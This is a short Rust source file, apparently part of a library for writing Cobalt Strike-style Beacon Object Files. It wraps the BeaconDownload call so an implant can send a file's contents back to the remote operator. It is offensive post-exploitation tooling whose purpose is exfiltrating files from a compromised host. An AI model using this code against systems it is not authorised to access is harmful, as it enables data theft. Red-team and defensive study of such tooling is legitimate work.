//! File download to the operator.

use crate::beacon_api;
use crate::str::to_cstr;

/// Sends a file to the operator for download.
#[inline]
pub fn send(filename: &str, data: &[u8]) -> bool {
    let filename = to_cstr(filename);
    (unsafe { BeaconDownload(filename.as_ptr().cast(), data.as_ptr(), data.len() as u32) }) != 0
}

beacon_api!(BeaconDownload: extern "C" fn(filename: *const u8, buffer: *const u8, length: u32) -> i32);
